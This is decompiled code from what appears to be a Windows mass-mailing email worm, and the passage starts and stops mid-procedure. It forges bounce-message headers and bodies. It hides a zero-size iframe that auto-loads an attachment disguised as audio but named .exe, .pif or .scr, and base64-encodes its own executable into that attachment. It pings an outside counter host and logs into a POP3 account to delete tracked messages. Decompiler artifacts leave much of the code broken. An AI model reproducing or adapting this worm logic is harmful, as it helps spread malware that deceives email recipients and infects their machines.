        (restore)ecx;
L00403886:
        if(!(eax = L00406850(4) - 1)) {
            if(!(eax = eax - 1)) {
                if(eax = eax - 1) {
                    goto L004038b8;
                }
                (save)"Email ";
            } else {
                (save)"Message ";
            }
        } else {
            (save)"Mail ";
        }
        (save)ebp + -544;
        L0040A100();
        (restore)ecx;
L004038b8:
        if(!(eax = L00406850(3) - 1)) {
            if(eax = eax - 1) {
                goto L004038e0;
            }
            (save)"Storage ";
        } else {
            (save)"Delivery ";
        }
        (save)ebp + -544;
        L0040A100();
        (restore)ecx;
L004038e0:
        eax = "Service";
        if(L00406840(50) == 0) {
            eax = "System";
        }
        (save)eax;
    }
    (save)ebp + -544;
    L0040A100();
    (restore)ecx;
L00403905:
    if(L00406840(20) != 0) {
        (save)ebp + -544;
        *__imp__CharLowerA();
    }
    if(L00406840(95) != 0) {
        L0040A100(esi, ebp + -544);
    }
    (save)"\" <";
    (save)esi;
    L0040A100();
    *(ebp + -544) = 0;
    (save)30;
    esp = esp + 12;
    if(L00406840() != 0) {
        (save)26;
        *(ebp + -544) = L00406850() + 96;
        *(ebp + -543) = 0;
        *esp = "mail";
    } else {
        if(!(eax = L00406850(7) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(!(eax = eax - 1)) {
                        if(!(eax = eax - 1)) {
                            if(!(eax = eax - 1)) {
                                if(eax = eax - 1) {
                                    goto L004039d4;
                                }
                                (save)"master";
                            } else {
                                (save)"mailer";
                            }
                        } else {
                            (save)"email";
                        }
                    } else {
                        (save)"smtp";
                    }
                } else {
                    (save)"web";
                }
            } else {
                (save)"mail";
            }
        } else {
            (save)"post";
        }
    }
    (save)ebp + -544;
    L0040A100();
    (restore)ecx;
L004039d4:
    eax = L00406850(9) - 1;
    if(eax <= 8) {
        goto *(eax * 4 + 0x404322)[L004039e9, L004039f0, L004039f7, L004039fe, L00403a05, L00403a0c, L00403a13, L00403a1a, L00403a21, ]goto ( *(eax * 4 + 0x404322));
        (save)"service";
        goto L00403a26;
        (save)"form";
        goto L00403a26;
        (save)"engine";
        goto L00403a26;
        (save)"automat";
        goto L00403a26;
        (save)"robot";
        goto L00403a26;
        (save)"daemon";
        goto L00403a26;
        (save)"program";
        goto L00403a26;
        (save)"routine";
        goto L00403a26;
        (save)"bot";
L00403a26:
        (save)ebp + -544;
        L0040A100();
        (restore)ecx;
    }
    L0040A100();
    eax = L00406850(9, ebp + -544, "@") - 1;
    if(eax <= 8) {
        goto *(eax * 4 + 0x404346)[L00403a5d, L00403a64, L00403a6b, L00403a72, L00403a79, L00403a80, L00403a87, L00403a8e, L00403a95, ]goto ( *(eax * 4 + 0x404346));
        (save)"rocketmail";
        goto L00403a9a;
        (save)"microsoft";
        goto L00403a9a;
        (save)"bigfoot";
        goto L00403a9a;
        (save)"aol";
        goto L00403a9a;
        (save)"yahoo";
        goto L00403a9a;
        (save)"freemail";
        goto L00403a9a;
        (save)"netmail";
        goto L00403a9a;
        (save)"america";
        goto L00403a9a;
        L0040A0F0(ebp + -636, "puremail");
    }
    L00406840(70);
    eax = ".com";
    if(eax == 0) {
    }
    (save)".net";
    (save)ebp + -636;
    L0040A100();
    (save)ebp + -636;
    (save)ebp + -544;
    L0040A100();
    (save)7;
    L00406840();
    esp = esp + 20;
    if(eax == 0) {
        goto L00403afa;
    }
    *(ebp + -544) = 32;
    *(ebp + -543) = 0;
    (save)ebp + -544;
    (save) *(ebp + 8);
    L0040A100();
    (save)">\r\nTO: \"";
    (save) *(ebp + 8);
    L0040A100();
    *(ebp + -544) = 0;
    (save)6;
    L00406850();
    esp = esp + 20;
    if(eax = eax - 1) {
        goto L00403b5e;
    }
    if(eax = eax - 1) {
        goto L00403b57;
    }
    if(eax = eax - 1) {
        goto L00403b50;
    }
    if(eax = eax - 1) {
        goto L00403b49;
    }
    if(eax = eax - 1) {
        goto L00403b42;
    }
    if(eax = eax - 1) {
        goto L00403b71;
    }
    (save)"Email ";
    goto L00403b63;
    (save)"Mail ";
    goto L00403b63;
    (save)"Inet ";
    goto L00403b63;
    (save)"Net ";
    goto L00403b63;
    (save)"Internet ";
    goto L00403b63;
    L0040A100(ebp + -544, "Network ");
    L00406850(4);
    if(eax = eax - 1) {
        goto L00403b9a;
    }
    if(eax = eax - 1) {
        goto L00403b93;
    }
    if(eax = eax - 1) {
        goto L00403b8c;
    }
    if(eax = eax - 1) {
        goto L00403bad;
    }
    (save)"Client";
    goto L00403b9f;
    (save)"Recipient";
    goto L00403b9f;
    (save)"Receiver";
    goto L00403b9f;
    L0040A100(ebp + -544, "User");
    L00406840(25);
    if(eax == 0) {
        goto L00403bc6;
    }
    (save)ebp + -544;
    *__imp__CharLowerA();
    L00406840(8);
    if(eax == 0) {
        goto L00403be0;
    }
    *(ebp + -544) = 32;
    *(ebp + -543) = 0;
    (save)ebp + -544;
    (save) *(ebp + 8);
    L0040A100();
    (save)ebx;
    (save) *(ebp + 8);
    L0040A100();
    *(ebp + -544) = 0;
    (save)4;
    L00406850();
    esp = esp + 20;
    if(eax = eax - 1) {
        goto L00403c2a;
    }
    if(eax = eax - 1) {
        goto L00403c23;
    }
    if(eax = eax - 1) {
        goto L00403c1c;
    }
    if(eax = eax - 1) {
        goto L00403c3d;
    }
    (save)"client";
    goto L00403c2f;
    (save)"recipient";
    goto L00403c2f;
    (save)"receiver";
    goto L00403c2f;
    L0040A100(ebp + -544, "user");
    L0040A100();
    L00406850(edi, ebp + -544, esi);
    if(eax = eax - 1) {
        goto L00403c88;
    }
    if(eax = eax - 1) {
        goto L00403c81;
    }
    if(eax = eax - 1) {
        goto L00403c7a;
    }
    if(eax = eax - 1) {
        goto L00403c73;
    }
    if(eax = eax - 1) {
        goto L00403c6c;
    }
    if(eax = eax - 1) {
        goto L00403c9b;
    }
    (save)"email";
    goto L00403c8d;
    (save)"smtp";
    goto L00403c8d;
    (save)"mail";
    goto L00403c8d;
    (save)"your";
    goto L00403c8d;
    (save)"mx";
    goto L00403c8d;
    L0040A100(ebp + -544, "home");
    L00406840(65);
    eax = "server";
    if(eax != 0) {
        goto L00403cb1;
    }
    L0040A100();
    L00406840(80, ebp + -544, "domain");
    eax = ".com";
    if(eax != 0) {
        goto L00403cd6;
    }
    L0040A100();
    L00406840(8, ebp + -544, ".net");
    if(eax == 0) {
        goto L00403d06;
    }
    *(ebp + -544) = 32;
    *(ebp + -543) = 32;
    *(ebp + -542) = 0;
    (save)ebp + -544;
    (save) *(ebp + 8);
    L0040A100();
    (save)">\r\nSUBJECT: ";
    (save)ebx;
    L0040A100();
    *(ebp + -544) = 0;
    (save)35;
    L00406840();
    esp = esp + 20;
    if(eax == 0) {
        goto L00403e02;
    }
    L00406850(4);
    if(eax = eax - 1) {
        goto L00403d59;
    }
    if(eax = eax - 1) {
        goto L00403d52;
    }
    if(eax = eax - 1) {
        goto L00403d6c;
    }
    (save)"Returned ";
    goto L00403d5e;
    (save)"Undeliverable ";
    goto L00403d5e;
    L0040A100(ebp + -544, "Undelivered ");
    L00406840(50);
    eax = "Mail";
    if(eax != 0) {
        goto L00403d82;
    }
    L0040A100();
    L00406840(70, ebp + -544, "Message");
    if(eax == 0) {
        goto L00403e8c;
    }
    L00406840(70);
    if(eax == 0) {
        goto L00403dc0;
    }
    L0040A100(ebp + -544, ":");
    L00406840(50);
    if(eax == 0) {
        goto L00403dfb;
    }
    L0040A100();
    L00406840(50, ebp + -544, " Returned To ");
    eax = "Sender";
    if(eax == 0) {
    }
    (save)"Mailer";
    goto L00403e7e;
    (save)" User unknown";
    goto L00403e7e;
    L00406850(edi);
    if(eax = eax - 1) {
        goto L00403e2a;
    }
    if(eax = eax - 1) {
        goto L00403e23;
    }
    if(eax = eax - 1) {
        goto L00403e1c;
    }
    if(eax = eax - 1) {
        goto L00403e3d;
    }
    (save)"Bug ";
    goto L00403e2f;
    (save)"Error ";
    goto L00403e2f;
    (save)"Abort ";
    goto L00403e2f;
    L0040A100(ebp + -544, "Failure ");
    L00406850(edi);
    if(eax = eax - 1) {
        goto L00403e79;
    }
    if(eax = eax - 1) {
        goto L00403e72;
    }
    if(eax = eax - 1) {
        goto L00403e6b;
    }
    if(eax = eax - 1) {
        goto L00403e64;
    }
    if(eax = eax - 1) {
        goto L00403e5d;
    }
    if(eax = eax - 1) {
        goto L00403e8c;
    }
    (save)"Letter";
    goto L00403e7e;
    (save)"Advice";
    goto L00403e7e;
    (save)"Message";
    goto L00403e7e;
    (save)"Announcement";
    goto L00403e7e;
    (save)"Report";
    goto L00403e7e;
    L0040A100(ebp + -544, "Notice");
    L00406840(25);
    if(eax == 0) {
        goto L00403ea5;
    }
    (save)ebp + -544;
    *__imp__CharLowerA();
    L00406840(8);
    if(eax == 0) {
        goto L00403eb8;
    }
    *(ebp + -544) = 0;
    L0040A100(ebx, ebp + -544);
    if(*L0041A6D8 == 0) {
        goto L00403ee9;
    }
    L0040A100();
    L0040A100(ebx, 0x412e74, ebx, "\r\nX-ID: ");
    (save)"\r\nMime-Version: 1.0\r\nContent-Type: multipart/alternative;\r\n\tboundary=\"";
    (save)ebx;
    L0040A100();
    (save)ebp + -616;
    (save)ebx;
    L0040A100();
    (save)"\"\r\n\r\n--";
    (save)ebx;
    L0040A100();
    (save)ebp + -616;
    (save)ebx;
    L0040A100();
    (save)"\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n";
    (save)ebx;
    L0040A100();
    *(ebp + -544) = 0;
    (save)"<HTML>\r\n<HEAD></HEAD>\r\n<BODY>\r\n";
    (save)ebp + -544;
    L0040A100();
    (save)"<iframe src=3D\"cid:";
    (save)ebp + -544;
    L0040A100();
    (save)10;
    L00406850();
    (save)eax + 5;
    (save)ebp - 44;
    L004068F4();
    esp = esp + 68;
    L0040A100();
    L0040A100();
    L00406840(30, ebp + -544, "\" height=3D0 width=3D0></iframe>\r\n", ebp + -544, eax);
    if(eax == 0) {
        goto L00403fa5;
    }
    L0040A100(ebp + -544, "<BR><BR>Hi.\r\n");
    L00406840(20);
    if(eax == 0) {
        goto L00403fc6;
    }
    L0040A100(ebp + -544, "<BR>This is the qmail program<BR>\r\n");
    goto L0040400a;
    L00406840(20);
    if(eax == 0) {
        goto L0040400a;
    }
    (save)"<BR>Message from ";
    (save)ebp + -544;
    L0040A100();
    (save)ebp + -636;
    (save)ebp + -544;
    L0040A100();
    (save)"\r\n<BR>";
    (save)ebp + -544;
    L0040A100();
    esp = esp + 24;
    L00406840(60);
    if(eax == 0) {
        goto L00404094;
    }
    L00406850(3);
    if(eax = eax - 1) {
        goto L00404035;
    }
    if(eax = eax - 1) {
        goto L0040402e;
    }
    if(eax = eax - 1) {
        goto L00404048;
    }
    (save)"<BR>I'm sorry =\r\n";
    goto L0040403a;
    (save)"<BR>I'm sorry to have to inform you that =\r\n";
    goto L0040403a;
    L0040A100(ebp + -544, "<BR>I'm afraid =\r\n");
    L00406840(50);
    if(eax == 0) {
        goto L0040405b;
    }
    (save)"I wasn't able to deliver your message =\r\n";
    goto L00404060;
    L0040A100(ebp + -544, "the message returned below could not be delivered =\r\n");
    L00406840(50);
    if(eax == 0) {
        goto L00404081;
    }
    (save)"to the following addresses:<BR>\r\n";
    goto L00404086;
    L0040A100(ebp + -544, "to one or more destinations.<BR>\r\n");
    L00406840(50);
    eax = "<BR><BR><BR>Undeliverable ";
    if(eax != 0) {
        goto L004040aa;
    }
    L0040A100();
    L00406850(3, ebp + -544, "<BR><BR><BR>Undelivered ");
    if(eax = eax - 1) {
        goto L004040ce;
    }
    if(eax = eax - 1) {
        goto L004040e1;
    }
    (save)"message ";
    goto L004040d3;
    L0040A100(ebp + -544, "mail ");
    (save)edi;
    L00406850();
    (save)eax + edi;
    (save)ebp + -596;
    L004068F4();
    (save)ebp + -636;
    (save)ebp + -596;
    (save)"to <B>%s@%s</B>\r\n";
    (save)ebp + -688;
    *__imp__wsprintfA();
    (save)ebp + -688;
    (save)ebp + -544;
    L0040A100();
    (save)50;
    L00406840();
    esp = esp + 40;
    if(eax == 0) {
        goto L0040414c;
    }
    L0040A100(ebp + -544, "<BR><BR><BR>Message follows:<BR><BR><BR><BR>\r\n");
    (save)"</BODY></HTML>\r\n\r\n";
    (save)ebp + -544;
    L0040A100();
    (save)ebp + -544;
    (save)ebx;
    L0040A100();
    *(ebp + -544) = 0;
    (save)ebp + -616;
    (save)"--%s\r\nContent-Type: audio/x-";
    (save)ebp + -544;
    *esi();
    (save)10;
    L00406840();
    esp = esp + 32;
    eax = "midi";
    if(eax == 0) {
    }
    (save)"wav";
    (save)ebp + -544;
    L0040A100();
    (save)"; name=\"";
    (save)ebp + -544;
    L0040A100();
    (save)edi;
    L00406850();
    (save)eax + 3;
    (save)ebp + -688;
    L004068F4();
    (save)8;
    L00406850();
    *(ebp + -688) = eax + 96;
    (save)ebp + -688;
    (save)ebp + -544;
    L0040A100();
    (save)".";
    (save)ebp + -544;
    L0040A100();
    (save)85;
    L00406840();
    esp = esp + 52;
    if(eax == 0) {
        goto L0040421b;
    }
    (save)"exe";
    goto L00404249;
    L00406850(4);
    if(eax = eax - 1) {
        goto L00404244;
    }
    if(eax = eax - 1) {
        goto L0040423d;
    }
    if(eax = eax - 1) {
        goto L00404236;
    }
    if(eax = eax - 1) {
        goto L00404257;
    }
    (save)"pif";
    goto L00404249;
    (save)"bat";
    goto L00404249;
    (save)"scr";
    goto L00404249;
    L0040A100(ebp + -544, "com");
    (save)"\"\r\nContent-Transfer-Encoding: base64\r\nContent-Id: <";
    (save)ebp + -544;
    L0040A100();
    (save)ebp - 44;
    (save)ebp + -544;
    L0040A100();
    (save)">\r\n\r\n";
    (save)ebp + -544;
    L0040A100();
    (save)ebp + -544;
    (save)ebx;
    L0040A100();
    esp = esp + 32;
    (save)500;
    (save)ebp + -544;
    (save)0;
    *__imp__GetModuleFileNameA();
    (save)ebp + -544;
    (save)ebx;
    L00404411();
    *(ebp + -544) = 0;
    (save)"\r\n\r\n--";
    (save)ebp + -544;
    L0040A100();
    (save)ebp + -616;
    (save)ebp + -544;
    L0040A100();
    (save)"--\r\n\r\n.\r\n";
    (save)ebp + -544;
    L0040A100();
    (save)ebp + -544;
    (save)ebx;
    L0040A100();
    esp = esp + 40;
    goto L0040430f;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x0040436A - 0x004048C5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040436A()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252560;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    esi = 0x412f48;
    ecx = 0x412f48;
    if(L00401946("ww2.fce.vutbr.cz", 80, *L0041A6DC) != 0) {
        ecx = esi;
        L00401B15(0);
        ecx = esi;
        L00401A9E("GET http://ww2.fce.vutbr.cz/bin/counter.gif/link=bacillus&width=6&set=cnt006 HTTP/1.0\r\n\r\n");
        ecx = esi;
        if(L00401B0D() != 0) {
            (save)10000;
            (save) *L00412DD4;
            *__imp__WaitForSingleObject();
        }
        ecx = esi;
        L004018D3();
        eax = 1;
L004043eb:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        eax = 0;
        goto L004043eb;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252576;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 52;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 44) = 0;
    *(ebp - 52) = 0;
    *(ebp - 4) = 0;
    if(*(ebp + 8) != 0 && *(ebp + 12) != 0) {
        esi = L0040A210( *(ebp + 8));
        *(ebp - 36) = esi;
        (save)ebx;
        (save)ebx;
        (save)3;
        (save)ebx;
        (save)3;
        (save)-2147483648;
        (save) *(ebp + 12);
        eax = *__imp__CreateFileA();
        *(ebp - 60) = eax;
        if(eax != -1) {
            (save)ebx;
            (save)eax;
            eax = *__imp__GetFileSize();
            *(ebp - 32) = eax;
            edi = L0040AA95( *(ebp - 32) + 2);
            *(ebp - 64) = edi;
            *(ebp - 56) = edi;
            if(edi == ebx) {
                (save) *(ebp - 60);
                *__imp__CloseHandle();
                eax = 0;
L004044af:
                *(ebp - 4) = *(ebp - 4) | -1;
                goto L004045f7;
            }
            (save)ebx;
            (save)ebp - 44;
            (save) *(ebp - 32);
            (save)edi;
            (save) *(ebp - 60);
            *__imp__ReadFile();
            *__imp__CloseHandle( *(ebp - 60));
            *(edi + *(ebp - 44)) = 0;
            eax = 0;
            *(ebp - 28) = 0;
            ecx = *(ebp - 40);
            ebx = *(ebp + 8);
L004044e5:
            if(eax < *(ebp - 32)) {
                *(ebp - 48) = 0;
L004044f2:
                if(*(ebp - 48) > 3) {
                    goto L004044e5;
                }
                edx = *(ebp - 48);
                == ? L00404544 : ;
                if(!(edx = edx - 1)) {
                    if(!(edx = edx - 1)) {
                        if(edx = edx - 1) {
                            goto L00404550;
                        }
                        ecx = *(eax + edi) & 63;
L0040450f:
                        *(ebp - 40) = ecx;
                        eax = eax + 1;
                        *(ebp - 28) = eax;
                        goto L00404550;
                    }
                    ecx = ( *(eax + edi) & 15) << 2;
                    edx = *(eax + edi + 1) >> 6 & 3;
                } else {
                    ecx = *(eax + edi + 1) >> 4 & 15;
                    edx = ( *(eax + edi) & 3) << 4;
                }
                ecx = ecx | edx;
                goto L0040450f;
                ecx = *(eax + edi) >> 2 & 63;
                *(ebp - 40) = ecx;
L00404550:
                if(ecx <= 25) {
                    edx = ecx + 65;
L00404558:
                    *(esi + ebx) = dl;
                } else {
                    if(ecx >= 26 && ecx <= 51) {
                        edx = ecx + 71;
                        goto L00404558;
                    }
                    if(ecx >= 52 && ecx <= 61) {
                        edx = ecx - 4;
                        goto L00404558;
                    }
                    if(ecx == 62) {
                        *(esi + ebx) = 43;
                    } else {
                        if(ecx == 63) {
                            *(esi + ebx) = 47;
                        }
                    }
                }
                *(ebp - 52) = *(ebp - 52) + 1;
                if(*(ebp - 52) == 76) {
                    *(ebp - 52) = 0;
                    esi = esi + 1;
                    *(ebp - 36) = esi;
                    *(esi + ebx) = 13;
                    esi = esi + 1;
                    *(ebp - 36) = esi;
                    *(esi + ebx) = 10;
                }
                esi = esi + 1;
                *(ebp - 36) = esi;
                *(ebp - 48) = *(ebp - 48) + 1;
                goto L004044f2;
            }
            eax = *(ebp - 32);
            edx = 0;
            (save)3;
            if(!(edx = ecx / ecx % ecx / ecx - 1)) {
                if(edx = edx - 1) {
                    goto L004045d4;
                }
            } else {
                *(esi + ebx - 2) = 61;
            }
            *(esi + ebx - 1) = 61;
L004045d4:
            *(esi + ebx) = 0;
            *(ebp - 68) = edi;
            L0040AB34(edi);
            eax = 1;
            goto L004044af;
            return(1);
            esp = *(ebp - 24);
        }
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L004045f7:
    ecx = *(ebp - 16);
    *%fs:0x0] = ecx;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252592;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    eax = 6112;
    L0040A560();
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    esi = 0x412f48;
    ecx = 0x412f48;
    L00401B15(1);
    edi = 4302128;
    ecx = 0x412f48;
    if(L00401946(4302128, 110, *L0041A6DC) == 0) {
        ecx = esi;
        if(L00401946(edi, 110, *L0041A6DC) != 0) {
            goto L00404680;
        }
L00404675:
        *L0041A59C = ebx;
    } else {
L00404680:
        if(L004048C6(10000) == 0) {
            goto L00404675;
        }
        edi = __imp__wsprintfA;
        *__imp__wsprintfA(ebp + -6136, "USER %s\r\n", 0x412e94);
        ecx = esi;
        L00401A9E(ebp + -6136);
        ebx = 7000;
        if(L004048C6(7000) != 0) {
            *edi(ebp + -6136, "PASS %s\r\n", 4302240);
            ecx = esi;
            L00401A9E(ebp + -6136);
            if(L004048C6(ebx) != 0) {
                L0040A0F0(ebp + -6136, "STAT\r\n");
                ecx = esi;
                L00401A9E(ebp + -6136);
                (save)15000;
                (save) *L00412DD4;
                ebx = __imp__WaitForSingleObject;
                if(*__imp__WaitForSingleObject() != 258) {
                    ecx = esi;
                    L00401830(ebp + -6136, 99);
                    (save)ebp + -6136;
                    *__imp__CharUpperA();
                    if(L0040A5F0(ebp + -6136, "+OK ", 4) == 0) {
                        *(ebp - 28) = ebp + -6132;
                        eax = L0040ABCA(ebp + -6132);
                        *(ebp + -6036) = eax;
                        if(*(ebp + -6036) > 0) {
                            *(ebp + -6032) = 1;
L004047a4:
                            if(*(ebp + -6032) > *(ebp + -6036)) {
                                goto L00404883;
                            }
                            ecx = esi;
                            if(L00401B0D() != 0) {
                                ecx = esi;
                                L00401B15(0);
                                *edi(ebp + -6136, "TOP %d 30\r\n", *(ebp + -6032));
                                ecx = esi;
                                L00401A9E(ebp + -6136);
                                (save)20000;
                                (save) *L00412DD4;
                                if(*ebx() != 258) {
                                    goto L00404813;
                                }
                            }
                        }
                    }
                }
            }
        }
        *L0041A59C = 0;
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004048b5;
L00404813:
    ecx = esi;
    L00401830(ebp + -6028, 5999);
    if(L0040A070(ebp + -6028, 0x412e74) != 0) {
        ecx = esi;
        L00401B15(1);
        *edi(ebp + -6136, "DELE %d\r\n", *(ebp + -6032));
        ecx = esi;
        L00401A9E(ebp + -6136);
        (save)7000;
        (save) *L00412DD4;
        *ebx();
    }
    *(ebp + -6032) = *(ebp + -6032) + 1;
    goto L004047a4;
L00404883:
    ecx = esi;
    L00401A9E("QUIT\r\n");
    (save)500;
    *__imp__Sleep();
    ecx = esi;
    L004018D3();
    goto L004048aa;
    return(1);
    esp = *(ebp - 24);
L004048aa:
    *(ebp - 4) = *(ebp - 4) | -1;
    *L0041A59C = 0;
L004048b5:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(0);
}

/* DEST BLOCK NOT FOUND: 0040492a -> 00404939 */
/* DEST BLOCK NOT FOUND: 00404934 -> 00404fda */
/*	Procedure: 0x004048C6 - 0x0040492E
 *	Argument size: 4
 *	Local size: 12
 *	Save regs size: 4
 */

L004048C6(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff4;



    esi = 0x412f48;
    ecx = 0x412f48;
    if(L00401B0D() != 0) {
        (save)A8;
        (save) *L00412DD4;
        if(*__imp__WaitForSingleObject() != 258) {
            ecx = esi;
            L00401830( & Vfffffff4, 4);
            (save)"+OK ";
            (restore)ecx;
            if(L0040D680( & Vfffffff4) == 0) {
                goto L0040491f;
            }
        }
        ecx = esi;
        L004018D3();
    }
    eax = 0;
    goto L00404922;
L0040491f:
    eax = 1;
L00404922:
    return;
    L0040492F();
    goto L00404939;
}

/* DEST BLOCK NOT FOUND: 0040494a -> 00405038 */
/*	Procedure: 0x0040492F - 0x0040494E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040492F()
{



    ecx = 0x412f48;
    goto L00404fda;
    return(L0040AC53(0x404945));
    ecx = 0x412f48;
    goto L00405038;
}

stack space not deallocated on return
/*	Procedure: 0x0040494F - 0x00404A77
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0040494F()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252608;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 188;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    *L0041A594 = *(ebp + 8);
    (save)100;
    eax = *__imp__GetWindowsDirectoryA(0x412f00);
    *(ebp - 28) = eax;
    *( *(ebp - 28) + 0x412f00) = bl;
    *(ebp + -204) = ebx;
    (save)36;
    eax = 0;
    edi = ebp + -200;
    asm("rep stosd");
    *(ebp + -204) = 148;
    (save)ebp + -204;
    if(*__imp__GetVersionExA() == 0) {
        *L0041A66C = 1;
    }
    *L0041A66C = 0 & 255;
    (save)32771;
    *__imp__SetErrorMode();
    esi = *(ebp + 16);
    if(L0040A210(esi) == 0) {
        L004089A1();
    } else {
        if(L0040D680(esi, "autorun") != 0) {
            if(L0040D680(esi, "showerror") == 0) {
                L004069E2();
            } else {
                L00406BE3(esi);
            }
        }
    }
    if(L00404A78() != 0) {
        while(1) {
            (save)ebx;
            (save)ebx;
            (save)ebx;
            (save)ebp - 56;
            if(*__imp__GetMessageA() == 0) {
                goto L00404a61;
            }
            *__imp__DispatchMessageA(ebp - 56);
        }
        return(1);
        esp = *(ebp - 24);
    }
L00404a61:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x00404A78 - 0x00404CF4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00404A78()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252624;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 160;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    esi = "Explorer XBaseBar";
    (save)esi;
    if(*__imp__FindWindowA(esi) == 0) {
        *(ebp - 76) = ebx;
        (save)11;
        edi = ebp - 72;
        asm("rep stosd");
        *(ebp - 76) = 48;
        *(ebp - 68) = 0x405067;
        *(ebp - 56) = *L0041A594;
        *(ebp - 36) = esi;
        (save)ebp - 76;
        *__imp__RegisterClassExA();
        if(ax != 0) {
            (save)ebx;
            (save) *L0041A594;
            (save)ebx;
            (save)ebx;
            (save)100;
            (save)300;
            (save)250;
            (save)250;
            (save)13565952;
            (save)esi;
            (save)esi;
            (save)ebx;
            *L0041A6DC = *__imp__CreateWindowExA();
            esi = 4302344;
            eax = L00406DCD(4302344);
            if(eax == 0) {
L00404b2c:
                *(ebp - 4) = *(ebp - 4) | -1;
                goto L00404ce6;
            }
            edi = -2147483646;
            if(L0040679E(-2147483646, esi, "Email Address", 0x412e10) != 0 && L0040679E(edi, esi, "Server", 4302452) != 0) {
                *L0041A670 = 1;
            }
            (save)0x412f38;
            (save)"ZipName";
            (save)esi;
            (save)edi;
            L0040679E();
            (save)0x412dd8;
            (save)"VicName";
            (save)esi;
            (save)edi;
            L0040679E();
            (save)ebp + -176;
            (save)"CacheBox Outfit";
            (save)esi;
            (save)edi;
            L0040679E();
            (save)"yes";
            (save)ebp + -176;
            esp = esp + 56;
            if(L0040D680() == 0) {
                *L00412E0C = 1;
            }
            L0040679E();
            if(L0040D680(ebp + -176, "yes", edi, esi, "Counter Visited", ebp + -176) == 0) {
                *L00412F34 = 1;
            }
            if(L0040679E(edi, esi, "Login", 0x412e94) != 0 && L0040679E(edi, esi, "Pass", 4302240) != 0 && L0040679E(edi, esi, "POP Server", 4302128) != 0 && L0040679E(edi, esi, "X-ID", 0x412e74) != 0) {
                *L0041A6D8 = 1;
            }
            if(*L0041A670 != ebx) {
                *(ebp - 28) = 20000;
                if(*L00412E0C != ebx) {
                    goto L00404c88;
                }
            }
            *(ebp - 28) = 120000;
L00404c88:
            (save)0x404cf5;
            (save) *(ebp - 28);
            (save)ebx;
            (save)ebx;
            esi = __imp__SetTimer;
            *L00412EF8 = *__imp__SetTimer();
            (save)0x40133b;
            (save)45000;
            (save)ebx;
            (save)ebx;
            *L0041A598 = *esi();
            L0040133B(ebx, ebx, ebx, ebx);
            L00406A51();
            if(*L0041A670 != ebx) {
                L00404CF5(ebx, ebx, ebx, ebx);
            }
            eax = 1;
            goto L00404b2c;
            return(1);
            esp = *(ebp - 24);
        }
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00404ce6:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00404CF5 - 0x00405107
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L00404CF5()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252640;
    (save)0x40a384;
    eax = *%fs:0x0];
    (save)eax;
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    if(*L0041A59C == 0) {
        if(*L00412E0C == 0) {
            *L0041A59C = 1;
            eax = L0040772C(0);
            if(*L00412E0C != esi && *L0041A670 != esi) {
                (save)0x404cf5;
                (save)20000;
                (save) *L00412EF8;
                (save)esi;
                eax = *__imp__SetTimer();
            }
L00404d6c:
            *L0041A59C = esi;
        } else {
